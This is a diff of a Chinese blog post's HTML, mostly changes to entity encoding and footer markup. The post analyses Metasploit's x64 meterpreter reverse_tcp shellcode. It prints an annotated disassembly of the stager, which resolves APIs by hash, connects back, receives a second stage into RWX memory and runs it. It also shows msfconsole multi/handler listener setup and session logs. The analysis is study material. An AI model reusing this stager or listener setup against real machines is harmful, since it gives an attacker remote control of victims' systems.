-<p>两个 <code>jcc</code> 计算规则和上面一样，这里就不多说了。<br>跳转的位置如下。<br><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/18.png"><br>把刚才 <code>push</code> 进来的两项内容 <code>pop</code> 回去，然后通过解析 <code>[rdx]</code> 继续转到下一个 <code>_LDR_DATA_TABLE_ENTRY</code> &#x2F; dll &#x2F; pe，并回到一开始获取 <code>BaseDllName</code> 的位置（<code>movzx rcx,word ptr ds:[rdx+4A]</code>）。</p>
-<p>总的来说，就是检查了 pe &#x2F; dll 的位数以及导出表情况，通过这两种方式提前排除掉不匹配的 dll。</p>
+<p>两个 <code>jcc</code> 计算规则和上面一样，这里就不多说了。<br>跳转的位置如下。<br><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/18.png"><br>把刚才 <code>push</code> 进来的两项内容 <code>pop</code> 回去，然后通过解析 <code>[rdx]</code> 继续转到下一个 <code>_LDR_DATA_TABLE_ENTRY</code> / dll / pe，并回到一开始获取 <code>BaseDllName</code> 的位置（<code>movzx rcx,word ptr ds:[rdx+4A]</code>）。</p>
+<p>总的来说，就是检查了 pe / dll 的位数以及导出表情况，通过这两种方式提前排除掉不匹配的 dll。</p>
 <hr>
 <p><em>解析导出表，找到指定的函数。</em></p>
 <p><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/19.png"></p>
 <p>在检查完导出表 rva 不为 0 之后，就跳转到导出表的对应位置。<br>其中 <code>rax+20</code>、<code>rax+18</code> 均与下面这个结构体有关，这两者解析了导出表中的 <code>AddressOfNames</code> 和 <code>NumberOfNames</code> 这两个字段，用于查找导出表中的函数名称。</p>
-<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_EXPORT_DIRECTORY</span> <span class="token punctuation">&#123;</span>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_EXPORT_DIRECTORY</span> <span class="token punctuation">{</span>
     DWORD   Characteristics<span class="token punctuation">;</span> <span class="token number">0</span>
     DWORD   TimeDateStamp<span class="token punctuation">;</span> <span class="token operator">+</span><span class="token number">4</span>
     WORD    MajorVersion<span class="token punctuation">;</span> <span class="token operator">+</span><span class="token number">8</span>
@@ -448,7 +634,7 @@ Saved as: ./payload<span aria-hidden="true" class="line-numbers-rows"><span></sp
     DWORD   AddressOfFunctions<span class="token punctuation">;</span> <span class="token operator">+</span><span class="token number">1</span>ch
     DWORD   AddressOfNames<span class="token punctuation">;</span> <span class="token operator">+</span><span class="token number">20</span>h
     DWORD   AddressOfNameOrdinals<span class="token punctuation">;</span> <span class="token operator">+</span><span class="token number">24</span>h
-<span class="token punctuation">&#125;</span> IMAGE_EXPORT_DIRECTORY<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_EXPORT_DIRECTORY<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token punctuation">}</span> IMAGE_EXPORT_DIRECTORY<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_EXPORT_DIRECTORY<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>最终 <code>r8d</code> 存放 <code>AddressOfNames</code> 指针，<code>ecx</code> 存放函数名个数。</p>
 <p><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/20.png"></p>
 <p>清空 <code>r9</code> 寄存器用于存放哈希结果。<code>rcx</code> -1 用于计数（<code>NumberOfNames</code> 记录了有多少个函数名称，该值 -1 正好是指向最后一个函数名）。<br><code>[r8+rcx*4]</code> 解析每一个函数名 rva，与存放 DllBase 的 <code>rdx</code> 进行相加，就可以跳转到对应函数名的位置。<br><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/21.png"></p>
@@ -491,13 +677,13 @@ Saved as: ./payload<span aria-hidden="true" class="line-numbers-rows"><span></sp
 <p>这里有一个有意思的点，即 <code>connect</code> 函数有重试次数的设置。<br>如果超过了重试次数之后还没有连接到服务器，则会直接退出。<br>重试次数被设定为 10 次。<br><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/39.png"></p>
 <p><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/40.png"></p>
 <p>启动 msfconsole，<code>use exploits/multi/handler</code>，设置 payload <code>set payload windows/x64/meterpreter/reverse_tcp</code>，设置监听地址 <code>set LHOST 0.0.0.0</code>，设置监听端口 <code>set LPORT 4444</code>。</p>
-<pre class="line-numbers language-none"><code class="language-none">msf6 exploit(multi&#x2F;handler) &gt; show options
+<pre class="line-numbers language-none"><code class="language-none">msf6 exploit(multi/handler) &gt; show options
 
-Payload options (windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp):
+Payload options (windows/x64/meterpreter/reverse_tcp):
 
    Name      Current Setting  Required  Description
    ----      ---------------  --------  -----------
-   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process,
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process,
                                         none)
    LHOST     0.0.0.0          yes       The listen address (an interface may be specified)
    LPORT     4444             yes       The listen port
@@ -523,7 +709,7 @@ View the full module info with the info, or info -d command.<span aria-hidden="t
 
 <p>先接收了 4 个字节确认接下来要接收的 shellcode 长度，<br><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/46.png"></p>
 <p>然后调用 <code>VirtualAlloc</code> 分配了 0x31c46 字节大小的空间，权限是 <code>PAGE_EXECUTE_READWRITE</code>，即 rwx。<br><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/43.png"></p>
-<pre class="line-numbers language-none"><code class="language-none">jmp rax called: rax&#x3D;76FB5980, arg1&#x3D;0, arg2&#x3D;31C46, arg3&#x3D;1000, arg4&#x3D;40<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">jmp rax called: rax=76FB5980, arg1=0, arg2=31C46, arg3=1000, arg4=40<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc">定义</a>如下。</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c">LPVOID <span class="token function">VirtualAlloc</span><span class="token punctuation">(</span>
   <span class="token punctuation">[</span>in<span class="token punctuation">,</span> optional<span class="token punctuation">]</span> LPVOID lpAddress<span class="token punctuation">,</span>
@@ -540,7 +726,7 @@ View the full module info with the info, or info -d command.<span aria-hidden="t
 <li>加深了对通过 LDR 链表进行函数查找的理解。</li>
 </ul>
 <p>虽然标题写着是 <code>part 1</code>，但是 2 阶段的 shellcode 内容实在是有点多，有点分析不下去（还是要看官方仓库源码）。<br>而且在动态调试的时候，一旦停了下来，就会被 metasploit 自动关闭连接，还没有找到办法解决这个问题，非常难受。</p>
-<pre class="line-numbers language-none"><code class="language-none">msf6 exploit(multi&#x2F;handler) &gt; run
+<pre class="line-numbers language-none"><code class="language-none">msf6 exploit(multi/handler) &gt; run
 [*] Started reverse TCP handler on 0.0.0.0:4444 
 [*] Sending stage (203846 bytes) to 192.168.238.129
 [-] Meterpreter session 3 is not valid and will be closed
@@ -549,35 +735,35 @@ View the full module info with the info, or info -d command.<span aria-hidden="t
 [-] Meterpreter session 4 is not valid and will be closed
 [*] 192.168.238.129 - Meterpreter session 4 closed.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h1 id="（分析内容-汇编存档）"><a href="#（分析内容-汇编存档）" class="headerlink" title="（分析内容&#x2F;汇编存档）"></a>（分析内容&#x2F;汇编存档）</h1><pre class="line-numbers language-none"><code class="language-none">00000000FFD03570  | FC                   | cld                            | 清除 df 标志位
+<h1 id="（分析内容-汇编存档）"><a href="#（分析内容-汇编存档）" class="headerlink" title="（分析内容/汇编存档）"></a>（分析内容/汇编存档）</h1><pre class="line-numbers language-none"><code class="language-none">00000000FFD03570  | FC                   | cld                            | 清除 df 标志位
 00000000FFD03571  | 48:83E4 F0           | and rsp,FFFFFFFFFFFFFFF0       | 栈对齐
 00000000FFD03575  | E8 CC000000          | call notepad.FFD03646          | 将接下来的 shellcode 地址放到栈上
-00000000FFD0357A  | 41:51                | push r9                        | r9:&amp;&quot;Hd,&quot;&#x3D;&#x3D;&amp;L&quot;摈,&quot;
+00000000FFD0357A  | 41:51                | push r9                        | r9:&amp;"Hd,"==&amp;L"摈,"
 00000000FFD0357C  | 41:50                | push r8                        |
 00000000FFD0357E  | 52                   | push rdx                       |
 00000000FFD0357F  | 48:31D2              | xor rdx,rdx                    |
 00000000FFD03582  | 6548:8B52 60         | mov rdx,qword ptr gs:[rdx+60]  |
 00000000FFD03587  | 51                   | push rcx                       |
 00000000FFD03588  | 56                   | push rsi                       |
-00000000FFD03589  | 48:8B52 18           | mov rdx,qword ptr ds:[rdx+18]  | rdx &#x3D; ldr
-00000000FFD0358D  | 48:8B52 20           | mov rdx,qword ptr ds:[rdx+20]  | rdx &#x3D; InMemoryOrderModuleList 结点
+00000000FFD03589  | 48:8B52 18           | mov rdx,qword ptr ds:[rdx+18]  | rdx = ldr
+00000000FFD0358D  | 48:8B52 20           | mov rdx,qword ptr ds:[rdx+20]  | rdx = InMemoryOrderModuleList 结点
 00000000FFD03591  | 48:0FB74A 4A         | movzx rcx,word ptr ds:[rdx+4A] | BaseDllName-&gt;MaximumLength（因为是 InMemoryOrder，此时 rdx 在 +0x10 的位置）
-00000000FFD03596  | 4D:31C9              | xor r9,r9                      | r9:&amp;&quot;Hd,&quot;&#x3D;&#x3D;&amp;L&quot;摈,&quot;
+00000000FFD03596  | 4D:31C9              | xor r9,r9                      | r9:&amp;"Hd,"==&amp;L"摈,"
 00000000FFD03599  | 48:8B72 50           | mov rsi,qword ptr ds:[rdx+50]  | BaseDllName-&gt;Buffer
 00000000FFD0359D  | 48:31C0              | xor rax,rax                    | 清空rax
 00000000FFD035A0  | AC                   | lodsb                          | ds:si -&gt; al，将 buffer内容写到 al
-00000000FFD035A1  | 3C 61                | cmp al,61                      | 61:&#39;a&#39;
+00000000FFD035A1  | 3C 61                | cmp al,61                      | 61:'a'
 00000000FFD035A3  | 7C 02                | jl notepad.FFD035A7            | 将小写转为大写（此处默认所有内容均为英文字符？）
 00000000FFD035A5  | 2C 20                | sub al,20                      |
 00000000FFD035A7  | 41:C1C9 0D           | ror r9d,D                      | r9 记录 dll 变换 hash
 00000000FFD035AB  | 41:01C1              | add r9d,eax                    | 将字符内容加到 r9 上
-00000000FFD035AE  | E2 ED                | loop notepad.FFD0359D          | 0b0h - 9dh &#x3D; 19，0edh 是有符号数，-19
+00000000FFD035AE  | E2 ED                | loop notepad.FFD0359D          | 0b0h - 9dh = 19，0edh 是有符号数，-19
 00000000FFD035B0  | 52                   | push rdx                       |
-00000000FFD035B1  | 41:51                | push r9                        | r9:&amp;&quot;Hd,&quot;&#x3D;&#x3D;&amp;L&quot;摈,&quot;
+00000000FFD035B1  | 41:51                | push r9                        | r9:&amp;"Hd,"==&amp;L"摈,"
 00000000FFD035B3  | 48:8B52 20           | mov rdx,qword ptr ds:[rdx+20]  | DllBase
 00000000FFD035B7  | 8B42 3C              | mov eax,dword ptr ds:[rdx+3C]  | e_lfanew
 00000000FFD035BA  | 48:01D0              | add rax,rdx                    | 定位到_IMAGE_NT_HEADERS
-00000000FFD035BD  | 66:8178 18 0B02      | cmp word ptr ds:[rax+18],20B   | 判断程序位数，x86 &#x3D; 0x10b，x64 &#x3D; 0x20b
+00000000FFD035BD  | 66:8178 18 0B02      | cmp word ptr ds:[rax+18],20B   | 判断程序位数，x86 = 0x10b，x64 = 0x20b
 00000000FFD035C3  | 0F85 72000000        | jne notepad.FFD0363B           |
 00000000FFD035C9  | 8B80 88000000        | mov eax,dword ptr ds:[rax+88]  | 获取导出表 rva
 00000000FFD035CF  | 48:85C0              | test rax,rax                   | 检查是否存在导出表
@@ -587,28 +773,28 @@ View the full module info with the info, or info -d command.<span aria-hidden="t
 00000000FFD035D8  | 44:8B40 20           | mov r8d,dword ptr ds:[rax+20]  | AddressOfNames
 00000000FFD035DC  | 49:01D0              | add r8,rdx                     |
 00000000FFD035DF  | 8B48 18              | mov ecx,dword ptr ds:[rax+18]  | NumberOfNames
-00000000FFD035E2  | E3 56                | jrcxz notepad.FFD0363A         | 检查 rcx,&#x3D;0 时跳出
+00000000FFD035E2  | E3 56                | jrcxz notepad.FFD0363A         | 检查 rcx,=0 时跳出
 00000000FFD035E4  | 4D:31C9              | xor r9,r9                      | 计算 hash
 00000000FFD035E7  | 48:FFC9              | dec rcx                        | size - 1
 00000000FFD035EA  | 41:8B3488            | mov esi,dword ptr ds:[r8+rcx*4 |
 00000000FFD035EE  | 48:01D6              | add rsi,rdx                    |
 00000000FFD035F1  | 48:31C0              | xor rax,rax                    |
 00000000FFD035F4  | AC                   | lodsb                          |
-00000000FFD035F5  | 41:C1C9 0D           | ror r9d,D                      | r9d:&amp;&quot;Hd,&quot;&#x3D;&#x3D;&amp;L&quot;摈,&quot;
-00000000FFD035F9  | 41:01C1              | add r9d,eax                    | r9d:&amp;&quot;Hd,&quot;&#x3D;&#x3D;&amp;L&quot;摈,&quot;
+00000000FFD035F5  | 41:C1C9 0D           | ror r9d,D                      | r9d:&amp;"Hd,"==&amp;L"摈,"
+00000000FFD035F9  | 41:01C1              | add r9d,eax                    | r9d:&amp;"Hd,"==&amp;L"摈,"
 00000000FFD035FC  | 38E0                 | cmp al,ah                      |
 00000000FFD035FE  | 75 F1                | jne notepad.FFD035F1           | 到达字符串末尾时是空字符
 00000000FFD03600  | 4C:034C24 08         | add r9,qword ptr ss:[rsp+8]    | rsp + 8 是 dll hash
 00000000FFD03605  | 45:39D1              | cmp r9d,r10d                   | 比较函数哈希
 00000000FFD03608  | 75 D8                | jne notepad.FFD035E2           |
 00000000FFD0360A  | 58                   | pop rax                        | pop 导出表
-00000000FFD0360B  | 44:8B40 24           | mov r8d,dword ptr ds:[rax+24]  | r8d &#x3D; AddressOfNameOrdinals
+00000000FFD0360B  | 44:8B40 24           | mov r8d,dword ptr ds:[rax+24]  | r8d = AddressOfNameOrdinals
 00000000FFD0360F  | 49:01D0              | add r8,rdx                     | 跳转到 AddressOfNameOrdinals
 00000000FFD03612  | 6641:8B0C48          | mov cx,word ptr ds:[r8+rcx*2]  | 通过索引来找到 Ordinals，注意每一个 ordinals 都是 short
-00000000FFD03617  | 44:8B40 1C           | mov r8d,dword ptr ds:[rax+1C]  | r8d &#x3D; AddressOfFunctions
+00000000FFD03617  | 44:8B40 1C           | mov r8d,dword ptr ds:[rax+1C]  | r8d = AddressOfFunctions
 00000000FFD0361B  | 49:01D0              | add r8,rdx                     | 跳转到 AddressOfFunctions
-00000000FFD0361E  | 41:8B0488            | mov eax,dword ptr ds:[r8+rcx*4 | eax &#x3D; 函数地址，注意每一个地址 4 字节 rva
-00000000FFD03622  | 48:01D0              | add rax,rdx                    | 函数地址 &#x3D; rva + 当前 dll 地址
+00000000FFD0361E  | 41:8B0488            | mov eax,dword ptr ds:[r8+rcx*4 | eax = 函数地址，注意每一个地址 4 字节 rva
+00000000FFD03622  | 48:01D0              | add rax,rdx                    | 函数地址 = rva + 当前 dll 地址
 00000000FFD03625  | 41:58                | pop r8                         |
 00000000FFD03627  | 41:58                | pop r8                         | 当前 ldr 结点
 00000000FFD03629  | 5E                   | pop rsi                        | 恢复栈
@@ -637,7 +823,7 @@ View the full module info with the info, or info -d command.<span aria-hidden="t
 00000000FFD0366F  | 4C:89F1              | mov rcx,r14                    |
 00000000FFD03672  | 41:BA 4C772607       | mov r10d,726774C               | 目标 hash，为 LoadLibraryA
 00000000FFD03678  | FFD5                 | call rbp                       | 计算 hash
-00000000FFD0367A  | 4C:89EA              | mov rdx,r13                    | 返回自 jmp rax（LoadLibraryA），此处 r13 &#x3D; 栈空间
+00000000FFD0367A  | 4C:89EA              | mov rdx,r13                    | 返回自 jmp rax（LoadLibraryA），此处 r13 = 栈空间
 00000000FFD0367D  | 68 01010000          | push 101                       |
 00000000FFD03682  | 59                   | pop rcx                        |
 00000000FFD03683  | 41:BA 29806B00       | mov r10d,6B8029                | 目标 hash，为 WSAStartup
@@ -646,7 +832,7 @@ View the full module info with the info, or info -d command.<span aria-hidden="t
 00000000FFD0368D  | 41:5E                | pop r14                        |
 00000000FFD0368F  | 50                   | push rax                       |
 00000000FFD03690  | 50                   | push rax                       |
-00000000FFD03691  | 4D:31C9              | xor r9,r9                      | r9:&amp;&quot;Hd,&quot;&#x3D;&#x3D;&amp;L&quot;摈,&quot;
+00000000FFD03691  | 4D:31C9              | xor r9,r9                      | r9:&amp;"Hd,"==&amp;L"摈,"
 00000000FFD03694  | 4D:31C0              | xor r8,r8                      |
 00000000FFD03697  | 48:FFC0              | inc rax                        |
 00000000FFD0369A  | 48:89C2              | mov rdx,rax                    |
@@ -661,18 +847,18 @@ View the full module info with the info, or info -d command.<span aria-hidden="t
 00000000FFD036B5  | 48:89F9              | mov rcx,rdi                    |
 00000000FFD036B8  | 41:BA 99A57461       | mov r10d,6174A599              | 目标 hash，为 connect
 00000000FFD036BE  | FFD5                 | call rbp                       |
-00000000FFD036C0  | 85C0                 | test eax,eax                   | 连接失败时，eax&#x3D;0FFFFFFFFh
+00000000FFD036C0  | 85C0                 | test eax,eax                   | 连接失败时，eax=0FFFFFFFFh
 00000000FFD036C2  | 74 0A                | je notepad.FFD036CE            |
 00000000FFD036C4  | 49:FFCE              | dec r14                        | 重试次数
 00000000FFD036C7  | 75 E5                | jne notepad.FFD036AE           |
 00000000FFD036C9  | E8 93000000          | call notepad.FFD03761          | ntdll.RtlExitUserProcess
 00000000FFD036CE  | 48:83EC 10           | sub rsp,10                     |
 00000000FFD036D2  | 48:89E2              | mov rdx,rsp                    |
-00000000FFD036D5  | 4D:31C9              | xor r9,r9                      | r9:&amp;&quot;Hd,&quot;&#x3D;&#x3D;&amp;L&quot;摈,&quot;
+00000000FFD036D5  | 4D:31C9              | xor r9,r9                      | r9:&amp;"Hd,"==&amp;L"摈,"
 00000000FFD036D8  | 6A 04                | push 4                         |
 00000000FFD036DA  | 41:58                | pop r8                         |
 00000000FFD036DC  | 48:89F9              | mov rcx,rdi                    |
-00000000FFD036DF  | 41:BA 02D9C85F       | mov r10d,5FC8D902              | hash &#x3D; recv
+00000000FFD036DF  | 41:BA 02D9C85F       | mov r10d,5FC8D902              | hash = recv
 00000000FFD036E5  | FFD5                 | call rbp                       | 准备接收 2 阶段 shellcode
 00000000FFD036E7  | 83F8 00              | cmp eax,0                      |
 00000000FFD036EA  | 7E 55                | jle notepad.FFD03741           |
@@ -680,7 +866,7 @@ View the full module info with the info, or info -d command.<span aria-hidden="t
 00000000FFD036F0  | 5E                   | pop rsi                        |
 00000000FFD036F1  | 89F6                 | mov esi,esi                    |
 00000000FFD036F3  | 6A 40                | push 40                        |
-00000000FFD036F5  | 41:59                | pop r9                         | r9:&amp;&quot;Hd,&quot;&#x3D;&#x3D;&amp;L&quot;摈,&quot;
+00000000FFD036F5  | 41:59                | pop r9                         | r9:&amp;"Hd,"==&amp;L"摈,"
 00000000FFD036F7  | 68 00100000          | push 1000                      |
 00000000FFD036FC  | 41:58                | pop r8                         |
 00000000FFD036FE  | 48:89F2              | mov rdx,rsi                    |
@@ -688,8 +874,8 @@ View the full module info with the info, or info -d command.<span aria-hidden="t
 00000000FFD03704  | 41:BA 58A453E5       | mov r10d,E553A458              | VirtualAlloc
 00000000FFD0370A  | FFD5                 | call rbp                       |
 00000000FFD0370C  | 48:89C3              | mov rbx,rax                    | 在此处应该可以看到 rax 为分配的 rwx 空间
-00000000FFD0370F  | 49:89C7              | mov r15,rax                    | r15 &#x3D; rax
-00000000FFD03712  | 4D:31C9              | xor r9,r9                      | r9:&amp;&quot;Hd,&quot;&#x3D;&#x3D;&amp;L&quot;摈,&quot;
+00000000FFD0370F  | 49:89C7              | mov r15,rax                    | r15 = rax
+00000000FFD03712  | 4D:31C9              | xor r9,r9                      | r9:&amp;"Hd,"==&amp;L"摈,"
 00000000FFD03715  | 49:89F0              | mov r8,rsi                     |
 00000000FFD03718  | 48:89DA              | mov rdx,rbx                    |
 00000000FFD0371B  | 48:89F9              | mov rcx,rdi                    |
@@ -752,7 +938,7 @@ View the full module info with the info, or info -d command.<span aria-hidden="t
 
 
 
-<script defer>
+<script defer="">
   document.addEventListener('DOMContentLoaded', function () {
     const toggleIcon = document.querySelector('.sea-article-catalog-title .sea-svg-icon');
     const tocContent = document.querySelector('.sea-article-catalog > .toc');
@@ -769,13 +955,7 @@ View the full module info with the info, or info -d command.<span aria-hidden="t
   <div class="sea-footer-row">
     <div class="sea-footer-menu-link">
       
-        <a
-          class="sea-footer-link"
-          
-            target="_blank"
-          
-          href="https://github.com/shanzade"
-        >
+        <a class="sea-footer-link" target="_blank" href="https://github.com/shanzade">
           GitHub
         </a>
         <span class="sea-footer-link__dot">·</span>
@@ -804,10 +984,23 @@ View the full module info with the info, or info -d command.<span aria-hidden="t
   
 
 
-<script src="/js/main.js" defer></script>
+<script src="/js/main.js" defer=""></script>
 
 
-<script src="/js/theme.js" defer></script>
+<script src="/js/theme.js" defer=""></script>
 
-</body>
-</html>
+
+
+    <script>
+    (function () {
+      const tocDesktop = document.getElementById('toc-desktop');
+      const tocMobile = document.getElementById('toc-mobile');
+      const toc = tocDesktop || tocMobile;
+      if (!toc) return;
+      const toggle = document.getElementById('toc-toggle');
+      toggle.addEventListener('click', function () {
+        tocDesktop.classList.toggle('collapsed');//有则删 无则加
+      });
+    })();
+    </script>
+      </body></html>
